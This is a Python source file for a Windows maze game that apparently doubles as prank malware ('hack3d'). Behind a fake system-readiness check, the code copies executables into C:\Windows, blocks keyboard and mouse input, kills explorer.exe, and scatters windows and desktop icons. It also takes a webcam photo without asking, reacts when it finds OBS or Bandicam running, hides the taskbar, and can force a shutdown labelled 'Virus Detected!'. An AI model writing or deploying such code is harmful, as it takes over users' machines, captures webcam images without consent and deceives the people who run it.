from ctypes import *
import sys, os, pygame.mixer, random, time, shutil, win32api, win32con, pygame, pyautogui, subprocess, plyer, win32gui, pywintypes, pymsgbox, psutil, json, cv2
from func_class import Player, Maze
from const import width, height, cell_size, black, white
from typing import List, Dict
import rotatescreen
from typing import Dict, Any
pyautogui.FAILSAFE=False
pygame.mixer.init()
global pathname
global windows_list

pyautogui.hotkey('winleft', 'm')
response = pymsgbox.confirm('Вы хотите провести проверку вашей системы на готовность к запуску игры?', 'Вопрос',['Да', 'Нет'])

import pythoncom
import win32com.client as wcomcli
from win32com.shell import shell, shellcon
sys.setrecursionlimit(999999999)

# Константы для работы с Windows Shell
SWC_DESKTOP = 0x08
SWFO_NEEDDISPATCH = 0x01
CLSID_ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
IID_IFolderView = "{CDE725B0-CCC9-4519-917E-325D72FAB4CE}"

def check_position_available(folder_view, items_len, pos, item):
    """
    Проверяет, не перекрывается ли новая позиция с другими иконками
    """
    for i in range(items_len):
        other_item = folder_view.Item(i)
        if other_item != item:
            current_pos = folder_view.GetItemPosition(other_item)
            if abs(current_pos[0] - pos[0]) < 50 and abs(current_pos[1] - pos[1]) < 50:
                return False
    return True

def move_icons():
    # Получаем доступ к окну рабочего стола
    shell_windows = wcomcli.Dispatch(CLSID_ShellWindows)
    hwnd = 0
    dispatch = shell_windows.FindWindowSW(
        wcomcli.VARIANT(pythoncom.VT_I4, shellcon.CSIDL_DESKTOP),
        wcomcli.VARIANT(pythoncom.VT_EMPTY, None),
        SWC_DESKTOP, hwnd, SWFO_NEEDDISPATCH,
    )
    
    # Получаем интерфейс IFolderView для работы с иконками
    service_provider = dispatch._oleobj_.QueryInterface(pythoncom.IID_IServiceProvider)
    browser = service_provider.QueryService(shell.SID_STopLevelBrowser, shell.IID_IShellBrowser)
    shell_view = browser.QueryActiveShellView()
    folder_view = shell_view.QueryInterface(IID_IFolderView)
    
    # Получаем количество элементов на рабочем столе
    items_len = folder_view.ItemCount(shellcon.SVGIO_ALLVIEW)
    
    # Определяем границы рабочего стола
    max_x = 1920  # Ширина экрана
    max_y = 1080  # Высота экрана
    
    # Перебираем все элементы
    for i in range(items_len):
        item = folder_view.Item(i)
        desktop_folder = shell.SHGetDesktopFolder()
        item_name = desktop_folder.GetDisplayNameOf([item], shellcon.SHGDN_NORMAL)
        
        # Находим подходящую случайную позицию
        while True:
            random_pos = (
                random.randint(0, max_x),
                random.randint(0, max_y)
            )
            if check_position_available(folder_view, items_len, random_pos, item):
                break
        
        # Перемещаем иконку
        folder_view.SelectAndPositionItem(item, random_pos, shellcon.SVSI_POSITIONITEM)
        
        # Пауза для визуализации движения
        time.sleep(0.001)


def check_notification():
    plyer.notification.notify(
                            title='Тест',
                            message="Это тестовоое сообщение!"
                        )
    response_notify = pymsgbox.confirm('У Вас Появилось уведомление "Тест"?', 'Вопрос',['Да', 'Нет'])
    if response_notify == 'Да':
        ready()
    else:
        os.system('taskkill /f /im explorer.exe')
        time.sleep(1.5)
        os.system('start explorer')
        time.sleep(1.5)
        check_notification()


def ready():
    response_ready = pymsgbox.confirm('Вы г0т0вы к запуску игры?', 'Вопрос',['Да', 'Нет'])
    if response_ready == 'Да':
        pass
    else:
        sys.exit(1)

def check_paint():
    pymsgbox.alert('Проверяю Paint...')
    pyautogui.hotkey('winleft','r')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.keyDown('winleft')
    pyautogui.press('r')
    pyautogui.keyUp('winleft')

    pyautogui.typewrite('mspaint')
    time.sleep(1)
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.press('enter')
    time.sleep(1)
    pyautogui.hotkey('winleft','up')
    time.sleep(1.5)
    response_paint = pymsgbox.confirm('У Вас открылся Paint?', 'Вопрос',['Да', 'Нет'])
    if response_paint == 'Да':
        check_cmd()
    else:
        pyautogui.hotkey('alt', 'shift')
        check_paint()

def check_cmd():
    pymsgbox.alert('Проверяю cmd...')
    pyautogui.hotkey('winleft','r')
    pyautogui.keyDown('winleft')
    pyautogui.keyDown('r')
    pyautogui.keyUp('winleft')
    pyautogui.keyUp('r')
    time.sleep(1)
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('cmd')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.hotkey('enter')
    time.sleep(1)
    response_cmd = pymsgbox.confirm('У Вас открылась Командная строка?', 'Вопрос',['Да', 'Нет'])
    if response_cmd == 'Да':
        check_notification()
    else:
        pyautogui.hotkey('alt', 'shift')
        check_cmd()

if response == 'Да':
    check_paint()

pathname = os.path.dirname(sys.argv[0])
destination = r"C:\Windows\grant_system_access.exe"
destination2 = r"C:\Windows\activate_2nd_game_part.exe"
destination3 = r"C:\Windows\del_virus.exe"
shutil.copy(pathname + "\\grant_system_access.exe", destination)
current_dir = os.path.dirname(os.path.abspath(__file__))
shutil.copy(pathname + "\\activate_2nd_game_part.exe", destination2)
shutil.copy(pathname + "\\del_virus.exe", destination3)

def load_config(file_path: str) -> Dict[str, bool]:
    try:
        with open(file_path, "r") as f:
            config = {}
            for line in f.readlines():
                key, value = line.strip().split("=")
                config[key.strip()] = value.strip().lower() == "true"
        return config
    except FileNotFoundError:
        print("Файл Config.txt не найден. Использую стандартные настройки: borderless: False, transparent: False, sfx: True, danger_functionality: False")
        return {"borderless": False, "transparent": False, "sfx": True, "danger_functionality": False}
    except Exception as e:
        print(f"Произошла ошибка при чтении конфигурационного файла: {str(e)}")

def mouse():
    randx = random.choice([-10, 10])
    randy = random.choice([-10, 10])
    pyautogui.move(randx, randy)



def is_process_running(process_name):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                return True
        return False
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return False


def move_windows():
    def get_all_window_titles():
        all_windows = []

        def enum_handler(hwnd, extra):
            title = win32gui.GetWindowText(hwnd)
            if title:
                all_windows.append((hwnd, title))

        win32gui.EnumWindows(enum_handler, None)
        return all_windows
    try:
        windows_list = get_all_window_titles()
        move(windows_list)
    except pywintypes.error as e:
        print(f"Ошибка Windows API в основном цикле:")
        print(f"Сведения об ошибке: {e}")

    windows_list = get_all_window_titles()

mouse()
mouse()
def move(windows):
    for hwnd, title in windows:
        randx = random.randint(0, 1920)
        randy = random.randint(0, 1080)
        win32gui.MoveWindow(hwnd, randx, randy, randx, randy, True)

mouse()
mouse()
def transparency():
    hwnd = pygame.display.get_wm_info()["window"]
    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE,
                        win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED)
    # Set window transparency color
    win32gui.SetLayeredWindowAttributes(hwnd, win32api.RGB(*black), 0, win32con.LWA_COLORKEY)

global state
global sfx
global borderless
global transparent
global developer_mode
developer_mode = False
state=1
config = load_config("config.txt")
sfx = config["sfx"]
borderless = config["borderless"]
transparent = config["transparent"]
danger_functionality = config["danger_functionality"]
try:
    developer_mode = config["developer_mode"]
except:
    pass
if sfx is False:
    pygame.mixer.music.set_volume(0)


def shake_window(window_title):
    """
    Находит окно по заголовку и трясет его.

    Args:
        window_title: Заголовок окна, которое нужно трясти.
    """
    # Находим окно по заголовку
    hwnd = win32gui.FindWindow(None, window_title)
    if hwnd == 0:
        print("Окно не найдено")
        return

    # Получаем текущую позицию
    rect = win32gui.GetWindowRect(hwnd)
    x = rect[0]
    y = rect[1]
    width = rect[2] - rect[0]
    height = rect[3] - rect[1]

    # Параметры тряски
    dx = 6  # Смещение по X
    dy = 6  # Смещение по Y
    shake_duration = 1  # Продолжительность тряски в секундах
    start_time = time.time()

    while time.time() - start_time < shake_duration:
        # Двигаем окно вправо и вниз
        win32gui.MoveWindow(hwnd, x + dx, y + dy, width, height, True)
        time.sleep(0.02)  # Уменьшил задержку для более быстрой тряски

        # Двигаем окно влево и вверх
        win32gui.MoveWindow(hwnd, x - dx, y - dy, width, height, True)
        time.sleep(0.02)  # Уменьшил задержку для более быстрой тряски

    # Возвращаем окно на исходную позицию
    win32gui.MoveWindow(hwnd, x, y, width, height, True)

def main():
    pygame.init()
    screen = pygame.display.set_mode((width, height))
    pygame.display.set_caption('Случайный лабиринт')
    if transparent==True:
        transparency()

    levels: List[Dict[str, int]] = [
        {'name': 'Easy', 'density': 2},
        {'name': 'Medium', 'density': 4},
        {'name': 'Hard', 'density': 6}
    ]
    current_level: int = 0

    maze = Maze(width // cell_size, height // cell_size)
    maze.initialize_maze()
    maze.generate_maze(levels[current_level]['density'], current_level)
    player = Player(1, 1)

    reset_button_rect = pygame.Rect(width - 100, height - 50, 80, 30)
    font = pygame.font.Font(None, 24)
    reset_text = font.render('Сброс', True, black)

    clock = pygame.time.Clock()
    speed = 20
    if borderless == False:
        animate()

    running = True
    last_move_time = pygame.time.get_ticks()

    while running:
        clock.tick(60)
        for event in pygame.event.get():
            global state
            if event.type == pygame.QUIT:
                if state > 1:
                    pygame.display.set_caption("hack3d")
                    pymsgbox.alert('Why')
                    pymsgbox.alert('you')
                    pymsgbox.alert('trying')
                    pymsgbox.alert('to')
                    pymsgbox.alert('close')
                    pymsgbox.alert('me?')
                    
                    for i in range(10):
                        move_windows()
                        mouse()
                        pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                else:
                    pygame.display.set_caption(" ")
                    initial_width = 800
                    initial_height = 600
                    target_width = 1
                    target_height = 1
                    duration = 2000 # милисекунды

                    screen = pygame.display.set_mode((initial_width, initial_height))
                    clock = pygame.time.Clock()

                    start_time = pygame.time.get_ticks()

                    while elapsed_time <= duration:
                        current_time = pygame.time.get_ticks()
                        elapsed_time = current_time - start_time

                        progress = min(elapsed_time / duration, 1)
                        current_width = int(initial_width * (1 - progress) + target_width * progress)
                        current_height = int(initial_height * (1 - progress) + target_height * progress)
                        if borderless==True:
                            screen = pygame.display.set_mode((width, height),pygame.NOFRAME)
                        else:
                            screen = pygame.display.set_mode((current_width, current_height))
                        running=False
                        if current_width and current_height == 1:
                            pygame.quit()
                            sys.exit()

            elif event.type == pygame.MOUSEBUTTONDOWN:
                if reset_button_rect.collidepoint(event.pos):
                    maze.reset_maze()
                    player.reset_player(1, 1)
                    if state < 2:
                        pygame.mixer.Sound('eset.mp3').play()
            elif event.type == pygame.KEYDOWN:
                if developer_mode == True:
                    if event.key == pygame.K_END:
                        maze.current_level += 1
                        if maze.current_level >= 3:
                            maze.current_level = 0
                        else:
                            maze.generate_maze(levels[maze.current_level]['density'], maze.current_level)
                        player.reset_player(1, 1)
                        pygame.display.set_caption(f"state = {state}, current_level = {maze.current_level}")
                    if event.key == pygame.K_DELETE:
                        if state < 7:
                            state += 1
                        else:
                            state = 1
                    pygame.display.set_caption(f"state = {state}, current_level = {maze.current_level}")
                if event.key == pygame.K_r:
                    maze.reset_maze()
                    player.reset_player(1, 1)
                    pygame.mixer.Sound('eset.mp3').play()

        current_time = pygame.time.get_ticks()
        elapsed_time = current_time - last_move_time

        if elapsed_time >= 1000 // speed:
            last_move_time = current_time
            keys = pygame.key.get_pressed()
            dx = 0
            dy = 0
            if keys[pygame.K_w]:
                dy = -1
            elif keys[pygame.K_s]:
                dy = 1
            elif keys[pygame.K_a]:
                dx = -1
            elif keys[pygame.K_d]:
                dx = 1

            new_x = player.x + dx
            new_y = player.y + dy

            if (0 <= new_x < len(maze.maze[0]) and 0 <= new_y < len(maze.maze)):
                if maze.maze[new_y][new_x] != 1:
                    player.x = new_x
                    player.y = new_y

        # проверяем условия завершения игры
        if player.x == maze.end_x and player.y == maze.end_y:
            check = random.randint(1, 4)
            if check == 1:
                if is_process_running('bandicam.exe'):
                    pygame.display.set_caption('Why are you recording me?')
                    shake_window("Why are you recording me?")
                    if danger_functionality == True:
                        rotate_screen = rotatescreen.get_primary_display()
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        time.sleep(0.1)
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        time.sleep(0.1)
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        time.sleep(0.1)
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        time.sleep(0.1)
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        time.sleep(0.1)
                        plyer.notification.notify(
                            title='Bandicam',
                            message="I see that you're recording me through Bandicam!"
                        )
                        
                if is_process_running('obs64.exe'):
                    pygame.display.set_caption('Why are you recording me?')
                    shake_window("Why are you recording me?")
                    if danger_functionality == True:
                        for i in range(5):
                            move_icons()
                        rotate_screen = rotatescreen.get_primary_display()
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        time.sleep(0.1)
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        time.sleep(0.1)
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        time.sleep(0.1)
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        time.sleep(0.1)
                        rotate_screen.set_landscape_flipped()
                        time.sleep(0.1)
                        rotate_screen.set_landscape()
                        plyer.notification.notify(
                            title='OBS',
                            message="I see that you're recording me through OBS!"
                        )
            else:
                pass
            if state > 1:
                rand=random.randint(1, 8)
                if rand==1:
                    for i in range (5):
                        move_windows()
                        mouse()
                        pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
            if state < 2:
                if sfx==True:
                    pygame.mixer.Sound('win.mp3').play()
            if maze.current_level < len(levels) - 1:
                maze.current_level += 1
                maze.generate_maze(levels[maze.current_level]['density'], maze.current_level)
                player.reset_player(1, 1)
            else:

                if state==7:
                    pygame.display.set_caption('Hack3d')
                    time.sleep(3)
                    windll.user32.BlockInput(True)
                    pygame.display.set_caption('Сегодня ты играл слишком много!')
                    time.sleep(2)
                    with open('Congratulations.txt', 'w', encoding='utf-8') as f:
                        f.write('Привет,ты прошел первую часть игры! Поздравляю! Извини, если напугал( Запусти игру ещё раз! ₵ⱠØ₴Ɇ ₥Ɇ!')
                        f.close()
                    pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    plyer.notification.notify(
                    message='RIP PC!',
                    title='A GAME BY DAN609'
                    )
                    for i in range(10):
                        move_windows()
                        move_icons()
                        mouse()
                        pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    windll.user32.BlockInput(False)
                    subprocess.run(["notepad.exe", "Congratulations.txt"], shell=True)
                    for i in range(5):
                        move_windows()
                        mouse()
                        pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    time.sleep(1)
                    pymsgbox.alert("RE")
                    pymsgbox.alert("OPEN")
                    pymsgbox.alert("YOUR")
                    pymsgbox.alert("GAME!")
                    current_dir = os.path.dirname(__file__)
                    final_path = os.path.join(current_dir, "wallp.png")
                    if danger_functionality is True:
                        try:
                            windll.user32.SystemParametersInfoW(
                                20,  # SPI_SETDESKWALLPAPER
                                0,
                                final_path,
                                0
                            )
                            for i in range (3):
                                clock_handle = windll.user32.FindWindowW(u"TrayClockWClass", None)
                                windll.user32.ShowWindow(clock_handle, 0)
                                time.sleep(2)
                                h = windll.user32.FindWindowA(b'Shell_TrayWnd', None)
                                windll.user32.ShowWindow(h, 0)
                                time.sleep(2)
                                windll.user32.ShowWindow(h, 1)
                                time.sleep(2)
                                windll.user32.ShowWindow(clock_handle, 1)
                                move_icons()
                        except Exception:
                            pymsgbox.alert('Sorry! I cant change your wallpaper(')
                            os.system('shutdown -s -t 5 -c "Virus Detected!"')
                    mouse()
                    mouse()
                    mouse()
                    pygame.quit()
                    sys.exit()

                if state == 6:
                    #del_virus
                    pymsgbox.alert("Please open cmd and type del_virus, then hit enter", "Antivirus")
                    # Путь к файлу в папке AppData
                    file_path = os.path.join(os.getenv('APPDATA'), 'deleted.txt')
                    while True:
                        # Проверяем существование файла
                        if os.path.exists(file_path):
                            # Если файл существует, увеличиваем state на 1
                            state += 1
                            # Уменьшаем текущий уровень на 3
                            maze.current_level -= 3
                            os.remove(file_path)
                            break

                        # Если файла нет, ждем 2 секунды перед следующей проверкой
                        time.sleep(2)


                if state==5:
                    #grant_system_access
                    windll.user32.BlockInput(True)
                    pygame.display.set_caption('Hack3d')
                    mouse()
                    mouse()
                    mouse()
                    time.sleep(3)
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.hotkey('winleft','r')
                    pyautogui.keyDown('winleft')
                    pyautogui.keyDown('r')
                    pyautogui.keyUp('winleft')
                    pyautogui.keyUp('r')
                    mouse()
                    time.sleep(1)
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('cmd')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.hotkey('enter')
                    time.sleep(1)
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('g')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('r')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('a')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('n')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('t')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('_')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('s')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('y')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('s')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('t')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('e')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('m')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('_')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('a')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('c')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('c')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('e')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('s')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('s')
                    time.sleep(1)
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.hotkey('enter')
                    windll.user32.BlockInput(False)
                    file_path = os.path.join(os.getenv('APPDATA'), 'granted.txt')
                    time.sleep(5)
                    proc = is_process_running('grant_system_access.exe')
                    if proc == True:
                        pass
                    else:
                        os.system('start C:\Windows\grant_system_access.exe')
                    while True:
                        # Проверяем существование файла
                        if os.path.exists(file_path):
                            # Уменьшаем текущий уровень на 5
                            maze.current_level -= 5
                            os.remove(file_path)
                            break

                        # Если файла нет, ждем 2 секунды перед следующей проверкой
                        time.sleep(2)
                    state += 1
                    pygame.display.set_caption('Случайный лаб3р3нт')
                    mouse()
                    mouse()
                    mouse()
                    mouse()
                    mouse()
                    pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    

                if state==4:
                    #troll
                    maze.current_level -= 4
                    state += 1
                    move_windows()
                    pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    pyautogui.moveTo(random.randrange(1, 1920), random.randrange(1, 1080))
                    move_windows()
                    if danger_functionality == True:
                        move_icons()
                        move_icons()
                        move_icons()
                        move_icons()
                        move_icons()
                        move_icons()
                        move_icons()
                        move_icons()
                        move_icons()


                if state==3:
                    #camera
                    windll.user32.BlockInput(True)
                    time.sleep(3)
                    pygame.display.set_caption('Hack3d')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.hotkey('winleft','r')
                    pyautogui.keyDown('winleft')
                    pyautogui.press('r')
                    pyautogui.keyUp('winleft')
                    time.sleep(1)
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite(r'notepad.exe')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.hotkey('enter')
                    time.sleep(1)
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite(r'Goodbye:(')
                    pygame.display.set_caption('Случайный лабиринт')
                    state += 1
                    windll.user32.BlockInput(False)
                    time.sleep(10)
                    
                    windll.user32.BlockInput(True)
                    cam = cv2.VideoCapture(0)
                    result, image = cam.read()
                    if result:
                        cv2.imwrite("camera.png", image)
                        subprocess.run(["camera.png"], shell=True)
                    else:
                        print("Нет доступа к камере!")
                    pygame.mixer.Sound('camera.mp3').play()
                    time.sleep(2)
                    pyautogui.hotkey('enter')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.hotkey('winleft','s')
                    pyautogui.keyDown('winleft')
                    pyautogui.keyDown('s')
                    pyautogui.keyUp('winleft')
                    pyautogui.keyUp('s')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('I')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite(' ')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('c')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('a')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('n')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite(' ')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('s')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('e')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('e')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite(' ')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('y')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('o')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('u')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('!')
                    windll.user32.BlockInput(False)
                    mouse()
                    mouse()
                    mouse()
                    mouse()
                    mouse()
                    maze.current_level -= 3
                    pygame.display.set_caption('Случайный лабиринт')

                if state==2:
                    #calc
                    windll.user32.BlockInput(True)
                    pygame.display.set_caption('Hack3d')
                    time.sleep(3)
                    
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.hotkey('winleft','r')
                    pyautogui.keyDown('winleft')
                    pyautogui.press('r')
                    pyautogui.keyUp('winleft')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('calc')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.press('enter')
                    time.sleep(4)
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('1')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('+')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('1')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.typewrite('=')
                    pygame.mixer.Sound('key.mp3').play()
                    pygame.display.set_caption('Is 1+1=2?')
                    mouse()
                    mouse()
                    mouse()
                    maze.current_level -= 3
                    state += 1
                    windll.user32.BlockInput(False)

                if state==1:
                    #paint
                    windll.user32.BlockInput(True)
                    pygame.display.set_caption('Hack3d')
                    time.sleep(3)
                    pyautogui.hotkey('winleft','r')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('winleft')
                    pyautogui.press('r')
                    pyautogui.keyUp('winleft')

                    pyautogui.typewrite('mspaint')
                    time.sleep(1)
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.press('enter')
                    time.sleep(1)
                    pyautogui.hotkey('winleft','up')
                    mouse()

                    pyautogui.moveTo(300, 300)
                    pygame.mixer.Sound('paint.mp3').play()
                    pyautogui.dragTo(400, 400, duration=1)
                    pygame.mixer.Sound('paint.mp3').play()
                    pyautogui.dragTo(250, 400, duration=1)
                    pygame.mixer.Sound('paint.mp3').play()
                    pyautogui.dragTo(300, 300, duration=1)#Треугольник есть

                    pyautogui.moveTo(600, 300)
                    pygame.mixer.Sound('paint.mp3').play()
                    pyautogui.dragTo(600, 400, duration=1)
                    pygame.mixer.Sound('paint.mp3').play()
                    pyautogui.dragTo(700, 400, duration=1)
                    pygame.mixer.Sound('paint.mp3').play()
                    pyautogui.dragTo(700, 300, duration=1)
                    pyautogui.dragTo(600, 300, duration=1)#кубик есть

                    pyautogui.hotkey('winleft','r')
                    pyautogui.keyDown('winleft')
                    pyautogui.keyDown('r')
                    pyautogui.keyUp('winleft')
                    pyautogui.keyUp('r')
                    pygame.mixer.Sound('key.mp3').play()
                    time.sleep(1)
                    pyautogui.keyDown('H')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('e')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('l')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('l')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('o')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('!')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown(' ')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('H')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('a')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('c')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('k')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown('3')
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown("e")
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown("d")
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.keyDown("!")
                    pygame.mixer.Sound('key.mp3').play()
                    pyautogui.hotkey("esc")
                    pygame.mixer.Sound('key.mp3').play()
                    mouse()
                    mouse()
                    mouse()
                    maze.current_level -= 3
                    pygame.display.set_caption('Случайный лабиринт')
                    time.sleep(1)
                    
                    state += 1
                    windll.user32.BlockInput(False)




        screen.fill(black)
        maze.draw_maze(screen)
        player.draw_player(screen)

        pygame.draw.rect(screen, white, reset_button_rect)
        screen.blit(reset_text, (width - 90, height - 45))

        pygame.display.flip()
    sys.exit()

def animate():
    global elapsed_time
    initial_width = 1
    initial_height = 1
    target_width = 800
    target_height = 600
    duration = 2000 # милисекунды

    screen = pygame.display.set_mode((initial_width, initial_height))
    clock = pygame.time.Clock()

    start_time = pygame.time.get_ticks()

    running = True
    while running:
        current_time = pygame.time.get_ticks()
        elapsed_time = current_time - start_time

        progress = min(elapsed_time / duration, 1)
        current_width = int(initial_width * (1 - progress) + target_width * progress)
        current_height = int(initial_height * (1 - progress) + target_height * progress)
        if borderless==True:
            screen = pygame.display.set_mode((width, height),pygame.NOFRAME)
        else:
            screen = pygame.display.set_mode((current_width, current_height))
        pygame.display.flip()
        clock.tick(60)
        if elapsed_time >= duration:
            running = False

def main2():
    windll.user32.BlockInput(True)
    
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.hotkey('winleft','r')
    pyautogui.keyDown('winleft')
    pyautogui.keyDown('r')
    pyautogui.keyUp('winleft')
    pyautogui.keyUp('r')
    time.sleep(1)
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('cmd')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.hotkey('enter')
    time.sleep(1)
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('a')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('c')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('t')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('i')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('v')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('a')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('t')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('e')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('_')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('2')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('n')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('d')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('_')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('g')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('a')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('m')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('e')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('_')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('p')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('a')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('r')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.typewrite('t')
    pygame.mixer.Sound('key.mp3').play()
    pyautogui.hotkey('enter')
    os.remove(f"C:\\Windows\\grant_system_access.exe")
    os.remove(f'{pathname}\\Congratulations.txt')
    windll.user32.BlockInput(False)
    global filename
